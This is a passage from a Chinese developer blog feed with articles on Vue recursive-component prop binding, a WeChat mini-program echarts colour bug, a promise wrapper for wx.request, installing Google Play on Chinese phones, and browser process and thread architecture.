  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>custom-component</span> <span class="token attr-name">:foo</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bar<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">@update:</span>foo</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bar = $event<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>custom-component</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!-- 上面的写法等同于 --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>custom-component</span> <span class="token attr-name">:foo.sync</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bar<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>custom-component</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 在子组件内 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span>
    props<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"foo"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    methods<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token function">updatePropFoo</span><span class="token punctuation">(</span><span class="token parameter">newFoo</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">"update:foo"</span><span class="token punctuation">,</span> newFoo<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<span id="more"></span>

<h2 id="计算属性的-setter"><a href="#计算属性的-setter" class="headerlink" title="计算属性的 setter"></a>计算属性的 setter</h2><p><a href="https://cn.vuejs.org/v2/guide/computed.html#%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E7%9A%84-setter">计算属性</a> computed 默认只有 getter，我们也可以提供一个 setter。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span>
  data<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    firstName<span class="token operator">:</span> <span class="token string">"Tom"</span><span class="token punctuation">,</span>
    lastName<span class="token operator">:</span> <span class="token string">"Wu"</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  computed<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    fullName<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>firstName <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>lastName<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token function-variable function">set</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">newValue</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> newName <span class="token operator">=</span> newValue<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>firstName <span class="token operator">=</span> newName<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>lastName <span class="token operator">=</span> newName<span class="token punctuation">[</span>newName<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时我们修改 this.fullName = “Mark Chen”时，setter 会被调用，this.firstName 与 this.lastName 也会被相应更新。</p>
<h2 id="递归自定义组件prop的双向绑定"><a href="#递归自定义组件prop的双向绑定" class="headerlink" title="递归自定义组件prop的双向绑定"></a>递归自定义组件prop的双向绑定</h2><p>前面两个小节的知识是我们实现递归自定义组件prop双向绑定的基础。因为通过了解.sync的原理，我们知道双向绑定一定是通过事件将更新的值传递到父组件中去修改，子组件并不会直接修改prop。而递归子组件时，我们需要将prop再次传入子组件，那么最深层的子组件就会在次深层子组件中修改prop，而不是一直将事件传递到父组件去，这样就会报错了。而为了解决这个问题，我们在递归的子组件中不使用父组件传递进来的prop本身，而使用由prop创建出的computed属性，再在computed的setter中继续向上层组件传递更新prop的事件，这样就实现了递归组件prop的双向绑定。</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 父组件中 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>custom-component</span> <span class="token attr-name">:foo.sync</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bar<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>custom-component</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">import</span> CustomComponent <span class="token keyword">from</span> <span class="token string">"./CustomComponent.vue"</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span>
  name<span class="token operator">:</span> <span class="token string">"father"</span><span class="token punctuation">,</span>
  components<span class="token operator">:</span> <span class="token punctuation">&#123;</span> CustomComponent <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>
      bar<span class="token operator">:</span> <span class="token string">""</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 在子组件中 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>updateFoo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token comment">&lt;!-- 递归组件，使用计算属性 --></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>custom-component</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>condition==true<span class="token punctuation">"</span></span> <span class="token attr-name">:foo.sync</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>computedFoo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>custom-component</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">v-else</span><span class="token punctuation">></span></span>递归终结条件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span>
  name<span class="token operator">:</span> <span class="token string">"CustomComponent"</span><span class="token punctuation">,</span>
  props<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"foo"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  computed<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 递归组件中更新foo</span>
    computedFoo<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>foo<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token function-variable function">set</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">newValue</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">"update:foo"</span><span class="token punctuation">,</span> newValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  methods<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 更新foo</span>
    <span class="token function">updateFoo</span><span class="token punctuation">(</span><span class="token parameter">newFoo</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">"update:foo"</span><span class="token punctuation">,</span> newFoo<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这样我们就实现了递归自定义组件prop的双向绑定。</p>
]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>递归组件</tag>
        <tag>双向绑定</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序加载echarts图表报错无法从undefined上读取createView属性</title>
    <url>/2021/06/07/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8A%A0%E8%BD%BDecharts%E5%9B%BE%E8%A1%A8%E6%8A%A5%E9%94%99%E6%97%A0%E6%B3%95%E4%BB%8Eundefined%E4%B8%8A%E8%AF%BB%E5%8F%96createView%E5%B1%9E%E6%80%A7/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>小程序中按 echarts 官方文档引入 echarts，而后将 web 端 echarts 图表的配置（setOption 中需要的 options 对象）复制过来使用，发现小程序开发工具中可以正常加载图表，但一使用预览，就无法加载图表，而在预览下打开 vConsole 调试，直接闪退；使用真机调试，直接报错<code>Cannot not read property &#39;createView&#39; of undefined</code>。</p>
<h2 id="微信开放社区讨论"><a href="#微信开放社区讨论" class="headerlink" title="微信开放社区讨论"></a>微信开放社区讨论</h2><p>在微信开放社区查找相关错误，发现社区中关于真机调试报<code>Cannot not read property &#39;createView&#39; of undefined</code>错误的原因是真机调试不支持 canvas 2d，但预览模式是没问题的，故判断无法加载图表并闪退并非因为<code>Cannot not read property &#39;createView&#39; of undefined</code>错误造成。</p>
<h2 id="排除错误"><a href="#排除错误" class="headerlink" title="排除错误"></a>排除错误</h2><p>对比 echarts 官方示例，发现 echarts 官方示例加载完全没有问题，这时才开始怀疑是配置对象造成了加载失败（一直没有怀疑是因为 web 端加载无误，开发工具中加载也无误）。逐个调试配置对象，终于发现配置对象中，对颜色的定义有一行为<code>rgb(20 194 59)</code>，rgb 值中间未使用逗号分隔，这是 CSS4 的标准，而小程序并不支持 CSS4 标准的 color，用逗号分隔后，就没有问题了。</p>
]]></content>
      <categories>
        <category>微信小程序</category>
      </categories>
      <tags>
        <tag>微信小程序</tag>
        <tag>echarts</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序使用promise封装wx.request</title>
    <url>/2019/02/11/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BD%BF%E7%94%A8promise%E5%B0%81%E8%A3%85wx-request/</url>
    <content><![CDATA[<h1 id="用-promise-封装-wx-request"><a href="#用-promise-封装-wx-request" class="headerlink" title="用 promise 封装 wx.request"></a>用 promise 封装 wx.request</h1><p>在使用小程序请求的过程中我们会用到小程序的 wx.request 接口，但 wx.request 还是基于 callback 封装的，es6 出现后大家更习惯于使用 promise 形式的请求，所以这里我们使用 promise 简单封装一下。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 声明接口地址</span>
<span class="token keyword">const</span> <span class="token constant">BASE_URL</span> <span class="token operator">=</span> <span class="token string">"http://111.111.111.111:8080"</span><span class="token punctuation">;</span>
<span class="token comment">/*
 * 用promise封装wx.request
 * 传入具体请求的接口url，接口请求方式method，请求数据data
 */</span>
<span class="token keyword">const</span> <span class="token function-variable function">ajax</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">&#123;</span> url<span class="token operator">:</span> url<span class="token punctuation">,</span> method<span class="token operator">:</span> method<span class="token punctuation">,</span> data<span class="token operator">:</span> data <span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token operator">=></span>
  <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    wx<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
      <span class="token comment">// BASE_URL与url组合成最终需要的请求接口</span>
      url<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">BASE_URL</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
      <span class="token comment">// 若不传method参数，默认使用post方法</span>
      method<span class="token operator">:</span> method <span class="token operator">?</span> method <span class="token operator">:</span> <span class="token string">"post"</span><span class="token punctuation">,</span>
      data<span class="token operator">:</span> data<span class="token punctuation">,</span>
      header<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"content-type"</span><span class="token operator">:</span> <span class="token string">"application/x-www-form-urlencoded"</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token comment">// 请求成功使用resolve函数</span>
      <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token parameter">res</span> <span class="token operator">=></span> <span class="token function">resolve</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token comment">// 请求失败使用reject函数</span>
      <span class="token function-variable function">error</span><span class="token operator">:</span> <span class="token parameter">err</span> <span class="token operator">=></span> <span class="token function">reject</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 使用封装好的ajax</span>
<span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  url<span class="token operator">:</span> <span class="token string">"/test/getTest"</span><span class="token punctuation">,</span>
  method<span class="token operator">:</span> <span class="token string">"post"</span><span class="token punctuation">,</span>
  data<span class="token operator">:</span> <span class="token punctuation">&#123;</span> id<span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"ajax success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">err</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"ajax error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>微信小程序</category>
      </categories>
      <tags>
        <tag>微信小程序</tag>
        <tag>promise</tag>
      </tags>
  </entry>
  <entry>
    <title>手机googlePlay安装指南</title>
    <url>/2020/05/31/%E6%89%8B%E6%9C%BAgooglePlay%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h2 id="google-play-安装"><a href="#google-play-安装" class="headerlink" title="google play 安装"></a>google play 安装</h2><p>前置条件：科学上网</p>
<h3 id="1-在apkmirror网站上下载-Google-Play-Service-与-Google-Play-Store-安装包"><a href="#1-在apkmirror网站上下载-Google-Play-Service-与-Google-Play-Store-安装包" class="headerlink" title="1. 在apkmirror网站上下载 Google Play Service 与 Google Play Store 安装包"></a>1. 在<a href="https://apkmirror.com/">apkmirror</a>网站上下载 Google Play Service 与 Google Play Store 安装包</h3><h3 id="2-安装成功后在科学上网的环境下使用"><a href="#2-安装成功后在科学上网的环境下使用" class="headerlink" title="2. 安装成功后在科学上网的环境下使用"></a>2. 安装成功后在科学上网的环境下使用</h3><h2 id="故障排除"><a href="#故障排除" class="headerlink" title="故障排除"></a>故障排除</h2><ol>
<li><p>安装完成后，无法登陆（确保已科学上网）。报错信息为Couldn’t sign in, There was a problem communicating with Google servers. Try again later.</p>
</li>
<li><p>已登陆但报错：从服务器检索信息时出错。DF-DFERH-01。</p>
</li>
<li><p>明明已科学上网且登陆成功，但经常无法访问Google 服务。</p>
</li>
</ol>
<p>这些问题都是同一个原因引起的：国产手机系统默认将Google Play Service的请求地址更改为googleapis.cn，而google并未在大陆提供服务，故无法使用，默认状态下，需要很久才能判定googleapis.cn响应超时，转而去请求googleapis.com。可通过root权限修改手机host文件，将谷歌服务框架的请求修改为googleapis.com，或在科学上网工具中加入一条规则，使googleapis.cn重定向到googleapis.com来解决问题。也可以通过请求googleapis.cn时断开网络再重新连接，使对googleapis.cn的请求直接判定为失败，从而直接重定向到googleapis.com上。</p>
<p>上面的办法都是些治标不治本的法子，建议买外国手机。。。</p>
]]></content>
      <categories>
        <category>手机</category>
      </categories>
      <tags>
        <tag>手机</tag>
        <tag>google play</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器原理</title>
    <url>/2020/03/28/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h2 id="浏览器进程与线程"><a href="#浏览器进程与线程" class="headerlink" title="浏览器进程与线程"></a>浏览器进程与线程</h2><p>一些基本概念：</p>
<ul>
<li><p>进程是系统资源分配的最小单位</p>
</li>
<li><p>进程之间相互独立</p>
</li>
<li><p>线程是系统资源调度的最小单位</p>
</li>
<li><p>一个进程由一个或多个线程组成</p>
</li>
<li><p>多个线程在进程中协作完成任务</p>
</li>
<li><p>同一进程下的各个线程之间共享程序的内存空间（包括代码段、数据集、堆栈等）</p>
</li>
</ul>
<p>浏览器是多进程的，例如，每打开一个 Tab 页，就相当于创建了一个独立的浏览器进程</p>
<span id="more"></span>

<h3 id="浏览器主要进程"><a href="#浏览器主要进程" class="headerlink" title="浏览器主要进程"></a>浏览器主要进程</h3><ul>
<li><p>Browser 进程：浏览器主进程，只有一个，作用如下：</p>
<ul>
<li><p>负责浏览器界面显示，与用户交互。如前进，后退等</p>
</li>
<li><p>负责各个页面管理，创建销毁其他进程</p>
</li>
<li><p>将 Renderer 进程返回的内存中的 Bitmap 绘制到用户界面上</p>
</li>
<li><p>网络资源的管理，下载等</p>
</li>
</ul>
</li>
<li><p>GPU 进程：最多一个，用于 3D 绘制等</p>
</li>
<li><p>第三方插件进程：每个插件对应一个进程，仅当使用该插件时才创建</p>
</li>
<li><p>浏览器渲染进程：即 Renderer 进程，内部是多线程的，默认每个 Tab 页面都会创建一个渲染进程，互不影响。主要作用是<strong>页面渲染、脚本执行、事件触发等</strong></p>
</li>
</ul>
<h3 id="浏览器多进程的优劣"><a href="#浏览器多进程的优劣" class="headerlink" title="浏览器多进程的优劣"></a>浏览器多进程的优劣</h3><p>优点：</p>
<ol>
<li><p>避免单个 Tab 页面崩溃影响整个浏览器</p>
</li>
<li><p>避免第三方插件崩溃影响整个浏览器</p>
</li>
<li><p>多进程充分利用多核优势</p>
</li>
</ol>
<p>缺点：</p>
<p>内存资源消耗大</p>
<h3 id="渲染进程"><a href="#渲染进程" class="headerlink" title="渲染进程"></a>渲染进程</h3><p>前端开发主要需要关注的就是渲染进程，每个 Tab 都是一个独立的渲染进程，而每个渲染进程又是多线程的</p>
<h4 id="GUI-渲染线程"><a href="#GUI-渲染线程" class="headerlink" title="GUI 渲染线程"></a>GUI 渲染线程</h4><p>负责渲染浏览器界面，解析 HTML、CSS，构建 DOM Tree、CSS Rules Tree、Rendering Tree，回流与重绘等。</p>
<p>GUI 渲染线程与 JavaScript 引擎线程是互斥的，当 JavaScript 引擎执行时 GUI 线程会被挂起，GUI 更新会被保存在一个队列中等待 JavaScript 引擎空闲时再执行。</p>
<h4 id="JavaScript-引擎线程"><a href="#JavaScript-引擎线程" class="headerlink" title="JavaScript 引擎线程"></a>JavaScript 引擎线程</h4><p>负责处理 JavaScript 脚本程序。在一个 Tab 页的渲染进程中，永远都只有一个 JavaScript 线程，同时 GUI 渲染线程与 JavaScript 引擎线程是互斥的，所以如果 JavaScript 引擎线程执行时间过长，就会导致页面渲染卡顿，或页面初始加载时阻塞。</p>
<h5 id="JavaScript-为什么是单线程"><a href="#JavaScript-为什么是单线程" class="headerlink" title="JavaScript 为什么是单线程"></a>JavaScript 为什么是单线程</h5><p>JavaScript 是单线程的原因在于 JavaScript 的用途，它是一个脚本语言，主要用于处理 DOM 的操作和一些用户交互，这种不复杂的需求使用单线程的设计更简单，占用资源少，执行效率也更高，省去了多线程同时操作 DOM 时需要死锁等手段处理操作矛盾的麻烦。</p>
<p>当然，现今前端职能越来越多，页面也越来越复杂，JavaScript 有时候也需要承担一些计算密集型的需求，这就催生出了 Web Worker，它会创建一个额外的线程来执行耗时的 JavaScript，但它并未改变 JavaScript 引擎线程是单线程这一设定，因为 Web Worker 创建的线程完全受 JavaScript 引擎线程控制，且 Web Worker 创建的线程无法操作 DOM，只能通过 postMessage API 与 JavaScript 引擎线程通信。</p>
<h5 id="JavaScript-引擎线程和渲染线程的互斥性"><a href="#JavaScript-引擎线程和渲染线程的互斥性" class="headerlink" title="JavaScript 引擎线程和渲染线程的互斥性"></a>JavaScript 引擎线程和渲染线程的互斥性</h5><p>JavaScript 引擎线程与渲染线程互斥保证了渲染线程渲染页面时 DOM 是被 JavaScript 引擎修改后最新的，否则渲染线程使用的 DOM 和 JavaScript 引擎修改后的 DOM 不一致，可能造成更大的渲染开销，多次不必要的回流、重绘甚至是渲染错误。</p>
<h4 id="事件触发线程"><a href="#事件触发线程" class="headerlink" title="事件触发线程"></a>事件触发线程</h4><p>事件触发看似归属于 JavaScript 引擎，实际是一个独立的线程。当 JavaScript 引擎执行各类事件代码时，会将对应的任务（通常是回调函数）添加到事件线程中，当对应的事件符合触发条件被触发时，该线程会把事件回调函数添加到待处理队列的队尾，等待 JavaScript 引擎的处理</p>
<h4 id="定时触发线程"><a href="#定时触发线程" class="headerlink" title="定时触发线程"></a>定时触发线程</h4><p>即 setInterval 与 setTimeout 所在线程，与事件触发线程类似，独立于 JavaScript 引擎线程，因为 JavaScript 引擎线程阻塞时会影响计时准确，故独立出来。当计时完成触发时，事件（通常是回调函数）会被添加到消息队列，等待 JavaScript 引擎处理。</p>
<p>值得注意的是，尽管为了保证定时精确，已经将定时触发线程独立出来，但我们发现有时候定时任务依然延迟了。是计时出问题了吗？答案是否定的，定时触发线程已经保证了计时的精确，那么问题其实是出在消息队列了。定时触发线程只保证了事件被添加到消息队列的时间是精确的，但若是消息队列中有其他耗时任务，就无法保证定时任务精确执行了。</p>
<h4 id="异步-HTTP-请求线程"><a href="#异步-HTTP-请求线程" class="headerlink" title="异步 HTTP 请求线程"></a>异步 HTTP 请求线程</h4><p>在 XMLHttpRequest 连接后启动一个线程，若线程检测到请求的状态变更，且有回调函数的情况下，该线程会把回调函数添加到消息队列，等待执行。</p>
<h4 id="Web-Workers-线程"><a href="#Web-Workers-线程" class="headerlink" title="Web Workers 线程"></a>Web Workers 线程</h4><p>由于 JavaScript 线程的唯一性，当有密集型计算时 JavaScript 执行时间太长会导致页面阻塞，所以有了 Web Workers。Web Workers 使得一个 Web 应用程序可以在一个单独的线程中执行费时的处理任务，从而保证主线程（通常指 GUI 渲染线程）运行不被 JavaScript 引擎线程阻塞。</p>
<p>注意：</p>
<ul>
<li><p>Web Worker 线程服务于 JavaScript 引擎线程，完全受 JavaScript 引擎线程控制，且该线程无法操作 DOM</p>
</li>
<li><p>JavaScript 引擎线程与 Web Worker 线程间通过 postMessage API 通信</p>
</li>
<li><p>Web Worker 线程只属于一个浏览器渲染进程（即一个 Tab 页面）</p>
</li>
<li><p>Shared Worker 则是浏览器单独创建的用来运行 JavaScript 的<strong>进程</strong>，它可以被所有浏览器渲染进程共享，且一个浏览器中最多只能存在一个 Shared Worker 进程。</p>
</li>
</ul>
<h2 id="GUI-渲染线程-1"><a href="#GUI-渲染线程-1" class="headerlink" title="GUI 渲染线程"></a>GUI 渲染线程</h2><h3 id="浏览器内核"><a href="#浏览器内核" class="headerlink" title="浏览器内核"></a>浏览器内核</h3><p>浏览器内核指渲染引擎和 JavaScript 引擎，随着 JavaScript 引擎越来越独立，现在浏览器内核更倾向指代渲染引擎。</p>
<h3 id="页面加载过程"><a href="#页面加载过程" class="headerlink" title="页面加载过程"></a>页面加载过程</h3><ul>
<li><p>DNS 解析服务器 IP 地址</p>
</li>
<li><p>建立 TCP 连接</p>
</li>
<li><p>发送 HTTP 请求并接收服务器响应</p>
</li>
<li><p>客户端渲染页面</p>
</li>
</ul>
<p>前三步都是网络相关，最后一步是浏览器渲染部分，接下来着重讲客户端渲染。</p>
<h3 id="浏览器渲染过程"><a href="#浏览器渲染过程" class="headerlink" title="浏览器渲染过程"></a>浏览器渲染过程</h3><ul>
<li><p>根据 HTML 文件建立文档对象模型树（DOM Tree）</p>
</li>
<li><p>根据 HTML 中 link 的 CSS 文件建立样式规则树（CSS Rule Tree）</p>
